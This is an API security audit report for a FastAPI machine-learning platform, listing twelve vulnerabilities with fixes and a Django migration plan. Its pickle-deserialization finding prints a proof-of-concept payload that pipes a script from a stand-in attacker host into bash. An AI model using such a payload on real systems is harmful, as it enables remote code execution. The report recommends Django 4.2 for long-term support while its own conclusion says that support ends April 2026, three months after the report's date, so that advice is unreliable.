# API Security Audit Report - Xcapit FHE-ML Platform

**Date:** 2026-01-22
**Framework:** FastAPI (Current)
**Target Migration:** Django LTS 4.2
**Status:** PRE-PRODUCTION REVIEW

---

## Executive Summary

This security audit identified **12 vulnerabilities** in the current FastAPI implementation:

| Severity | Count | Status |
|----------|-------|--------|
| CRITICAL | 3 | Requires immediate attention |
| HIGH | 4 | Must fix before production |
| MEDIUM | 4 | Address in next sprint |
| LOW | 1 | Minor improvement |

**Overall Assessment:** The API is NOT ready for production deployment. Migration to Django LTS 4.2 is recommended to address architectural security concerns.

---

## Critical Vulnerabilities

### CRIT-01: Authentication Bypass via Environment Variable

**Severity:** CRITICAL
**CVSS Score:** 9.8
**File:** `sdk/api/auth.py:135-136`, `sdk/api/auth.py:337-338`

**Description:**
Setting `FHEML_AUTH_DISABLED=true` bypasses ALL authentication checks, granting anonymous users full read/write access to the entire API.

```python
# auth.py:135-136
if os.environ.get("FHEML_AUTH_DISABLED", "").lower() == "true":
    return {"name": "anonymous", "permissions": ["read", "write"]}

# auth.py:337-338
if os.environ.get("FHEML_AUTH_DISABLED", "").lower() == "true":
    return {"id": "demo_company", "name": "Demo Company"}
```

**Risk:**
- Complete authentication bypass if deployed with this variable
- No audit trail for anonymous access
- Environment variable exposure could compromise entire system
- Attackers gaining access to deployment config can bypass auth

**Recommendation:**
1. Remove this feature entirely
2. If needed for testing, restrict to development environments with additional safeguards
3. Never use environment variable toggles for security features

---

### CRIT-02: Pickle Deserialization (Remote Code Execution)

**Severity:** CRITICAL
**CVSS Score:** 9.1
**File:** `sdk/api/database_pg.py:379`, `sdk/api/database_pg.py:451-452`

**Description:**
Model parameters are serialized using Python's `pickle` module, which is inherently insecure and can lead to Remote Code Execution.

```python
# database_pg.py:379
params_blob = pickle.dumps(params) if params else None

# database_pg.py:451-452
def get_model_params(self, model_id: str) -> Optional[dict]:
    model = self.get_model(model_id)
    if model and model.params_blob:
        return pickle.loads(model.params_blob)  # VULNERABLE TO RCE
```

**Risk:**
- Attacker who can insert malicious data into database achieves RCE
- Database backups/imports could execute malicious code
- SQL injection could lead to code execution via pickle payloads
- Internal threat actors could plant backdoors

**Exploitation Scenario:**
```python
# Malicious payload that would execute on pickle.loads()
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

# Insert into database via SQL injection or direct access
malicious_blob = pickle.dumps(Exploit())
```

**Recommendation:**
1. Replace pickle with JSON or msgpack
2. Use Pydantic models with strict validation
3. Sign serialized data with HMAC
4. Never deserialize untrusted data

---

### CRIT-03: Insecure Direct Object Reference (IDOR)

**Severity:** CRITICAL
**CVSS Score:** 8.5
**Files:** Multiple route files

**Description:**
Several endpoints verify authentication but NOT authorization. Users can access resources belonging to other organizations.

**Example in `federated_routes.py:174-195`:**
```python
@router.post("/endpoints", response_model=EndpointResponse)
async def create_endpoint(
    request: CreateEndpointRequest,
    company: dict = Depends(get_current_company),
):
    # NO verification that company is member of consortium_id!
    manager = ConsortiumManager(get_db_path())
    endpoint = manager.create_inference_endpoint(
        consortium_id=request.consortium_id,  # ANY consortium_id accepted
        company_id=company["id"],
        ...
    )
```

**Affected Endpoints:**
- `POST /federated/endpoints` - create endpoints in any consortium
- `POST /federated/models` - create models in any consortium
- Many consortium routes lack member verification before operations

**Risk:**
- Cross-tenant data access
- Unauthorized resource modification
- Data leakage between organizations
- Compliance violations (GDPR, HIPAA)

**Recommendation:**
Add explicit authorization checks for ALL resource access:
```python
# Example fix
membership = manager.get_membership(request.consortium_id, company["id"])
if not membership or membership.status.value != "active":
    raise HTTPException(status_code=403, detail="Not a member of this consortium")
```

---

## High Severity Vulnerabilities

### HIGH-01: In-Memory Rate Limiter

**Severity:** HIGH
**CVSS Score:** 7.5
**File:** `sdk/api/auth.py:169-241`

**Description:**
Rate limiting uses in-memory dictionary storage, which fails in distributed deployments.

```python
class RateLimiter:
    def __init__(self):
        self._requests: dict = {}  # In-memory only - not shared across instances
```

**Risk:**
- Rate limits not enforced across multiple API instances
- Memory exhaustion tracking many API keys
- State lost on process restart
- DoS attacks can target individual instances

**Recommendation:**
- Use Redis for distributed rate limiting
- Implement sliding window algorithm
- Consider using `django-ratelimit` with Redis backend

---

### HIGH-02: Unrestricted Arbitrary Dict Input

**Severity:** HIGH
**CVSS Score:** 7.3
**Files:** Multiple route files

**Description:**
Many endpoints accept `dict[str, Any]` without validation, allowing arbitrary payloads.

**Examples:**
```python
# sandbox_routes.py:40
config: Optional[dict[str, Any]] = None

# federated_routes.py:35
input_data: dict[str, Any] = Field(..., description="Input data for prediction")

# governance_routes.py:79
data: Optional[dict[str, Any]] = Field(default=None)
```

**Risk:**
- NoSQL injection if dict passed to database queries
- Memory exhaustion with large payloads
- Type confusion attacks
- Unexpected application behavior

**Recommendation:**
Define strict Pydantic models for ALL inputs:
```python
class EndpointConfig(BaseModel):
    max_batch_size: int = Field(default=100, ge=1, le=1000)
    timeout_seconds: int = Field(default=30, ge=1, le=300)
    # ... only allowed fields
```

---

### HIGH-03: SQLite in Production

**Severity:** HIGH
**CVSS Score:** 6.8
**File:** `sdk/api/database.py`

**Description:**
Default database is file-based SQLite, not suitable for production use.

**Risk:**
- No concurrent write support (lock contention)
- File corruption under load
- Not horizontally scalable
- Local file access required (cloud deployment issues)
- No replication or failover

**Recommendation:**
- Enforce PostgreSQL for all production deployments
- Add startup check to prevent SQLite in production mode

---

### HIGH-04: SQL Query Construction Risk

**Severity:** HIGH
**CVSS Score:** 6.5
**File:** `sdk/api/database_pg.py:535`

**Description:**
SQL query uses f-string for column names construction.

```python
cursor.execute(f"UPDATE models SET {', '.join(updates)} WHERE id = %s", values)
```

**Risk:**
- While values are parameterized, dynamic column construction is risky
- Future modifications could introduce SQL injection
- Code review harder with dynamic SQL

**Recommendation:**
- Use ORM (Django ORM strongly recommended)
- Whitelist allowed column names
- Use static SQL statements

---

## Medium Severity Vulnerabilities

### MED-01: Timing Attack on Master Key

**Severity:** MEDIUM
**CVSS Score:** 5.9
**File:** `sdk/api/auth.py:94-95`

**Description:**
Master API key comparison is not constant-time.

```python
if master_key and api_key == master_key:  # String comparison leaks timing info
```

**Risk:**
- Theoretical timing attack to recover master key character-by-character

**Recommendation:**
```python
import secrets
if master_key and secrets.compare_digest(api_key, master_key):
```

---

### MED-02: Missing HTTPS Enforcement

**Severity:** MEDIUM
**CVSS Score:** 5.4
**Files:** All routes

**Description:**
No enforcement of HTTPS at application level.

**Risk:**
- API keys transmitted in cleartext over HTTP
- Man-in-the-middle attacks
- Session hijacking

**Recommendation:**
```python
# Add middleware
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware
app.add_middleware(HTTPSRedirectMiddleware)

# Add HSTS headers
from starlette.middleware import Middleware
from starlette.middleware.trustedhost import TrustedHostMiddleware
```

---

### MED-03: No API Key Rotation/Expiration

**Severity:** MEDIUM
**CVSS Score:** 4.8
**File:** `sdk/api/auth.py`

**Description:**
No mechanism for key rotation or expiration.

**Risk:**
- Compromised keys remain valid indefinitely
- No forced rotation policy
- Difficult to revoke access

**Recommendation:**
- Add expiration dates to API keys
- Implement key rotation API
- Add last rotation date tracking

---

### MED-04: Information Disclosure in Errors

**Severity:** MEDIUM
**CVSS Score:** 4.3
**Files:** Multiple

**Description:**
Default FastAPI error responses may expose internal details.

**Risk:**
- Stack traces in production
- Database error messages expose schema
- Internal paths revealed
- Aid to attackers in reconnaissance

**Recommendation:**
```python
from fastapi import Request
from fastapi.responses import JSONResponse

@app.exception_handler(Exception)
async def generic_exception_handler(request: Request, exc: Exception):
    # Log full error internally
    logger.error(f"Unhandled exception: {exc}", exc_info=True)
    # Return sanitized response
    return JSONResponse(
        status_code=500,
        content={"detail": "Internal server error"}
    )
```

---

## Low Severity Vulnerabilities

### LOW-01: Verbose/Inconsistent Logging

**Severity:** LOW
**CVSS Score:** 2.1
**Files:** Various

**Description:**
No centralized logging policy. Potential for sensitive data in logs.

**Recommendation:**
- Implement structured logging
- Add PII redaction
- Use log levels appropriately

---

## Compliance Gaps

### GDPR Compliance
- [ ] Data encryption at rest for PII
- [ ] Automated data retention enforcement
- [ ] Right to erasure (RTBF) implementation
- [ ] Data processing records incomplete

### HIPAA Compliance
- [ ] Audit log encryption
- [ ] BAA template documentation
- [ ] PHI handling controls
- [ ] Access controls insufficient

### SOC2 Compliance
- [ ] Change management documentation
- [ ] Vulnerability scanning not automated
- [ ] Incident response plan missing

---

## Recommended Migration to Django LTS 4.2

| Security Feature | FastAPI (Current) | Django LTS 4.2 |
|------------------|-------------------|----------------|
| ORM Security | Manual SQL | Parameterized queries by default |
| Authentication | Custom, vulnerable | django.contrib.auth + DRF |
| Authorization | Manual, incomplete | django.contrib.auth.permissions |
| Rate Limiting | In-memory | django-ratelimit + Redis |
| Session Management | None | django.contrib.sessions |
| CSRF Protection | None | Built-in middleware |
| SQL Injection | Risk with manual SQL | ORM prevents by default |
| Admin Interface | None | Django Admin built-in |
| Security Updates | Manual tracking | LTS: 3 years of security patches |
| XSS Protection | Manual | Auto-escaping templates |

---

## Migration Action Plan

### Phase 1: Immediate Security Fixes (Before Migration)
1. [ ] Remove `FHEML_AUTH_DISABLED` feature
2. [ ] Replace pickle with JSON serialization
3. [ ] Add authorization checks to all endpoints
4. [ ] Add constant-time key comparison

### Phase 2: Django Project Setup
1. [ ] Create Django 4.2 LTS project
2. [ ] Configure PostgreSQL
3. [ ] Set up Django REST Framework
4. [ ] Implement custom user model

### Phase 3: Model Migration
1. [ ] Convert database models to Django ORM
2. [ ] Create migrations
3. [ ] Migrate existing data

### Phase 4: API Migration
1. [ ] Port endpoints to DRF viewsets
2. [ ] Implement DRF serializers with validation
3. [ ] Add DRF authentication (JWT/Token)
4. [ ] Implement DRF permissions

### Phase 5: Security Hardening
1. [ ] Configure Django security settings
2. [ ] Set up Redis rate limiting
3. [ ] Implement audit logging
4. [ ] Add security headers

### Phase 6: Testing & Deployment
1. [ ] Security testing
2. [ ] Penetration testing
3. [ ] Load testing
4. [ ] Production deployment

---

## Files Reviewed

| File | Lines | Issues Found |
|------|-------|--------------|
| `sdk/api/auth.py` | 357 | 5 |
| `sdk/api/server.py` | ~500 | 2 |
| `sdk/api/database.py` | ~700 | 2 |
| `sdk/api/database_pg.py` | 737 | 3 |
| `sdk/api/consortium_routes.py` | ~300 | 1 |
| `sdk/api/governance_routes.py` | 717 | 1 |
| `sdk/api/compliance_routes.py` | 787 | 1 |
| `sdk/api/marketplace_routes.py` | 394 | 1 |
| `sdk/api/sandbox_routes.py` | 486 | 2 |
| `sdk/api/federated_routes.py` | 551 | 2 |

---

## Conclusion

The current FastAPI implementation has significant security vulnerabilities that must be addressed before production deployment. The recommended migration to Django LTS 4.2 will provide:

1. **Built-in security features** (CSRF, XSS, SQL injection protection)
2. **Long-term support** (security patches until April 2026)
3. **Mature authentication system** (django.contrib.auth)
4. **Battle-tested ORM** (prevents SQL injection by design)
5. **Admin interface** (for data management)
6. **Large ecosystem** (django-ratelimit, django-rest-framework, etc.)

**Recommendation:** Do NOT deploy to production until Critical and High severity issues are resolved.

---

**Report Generated:** 2026-01-22
**Next Review:** After Django migration complete
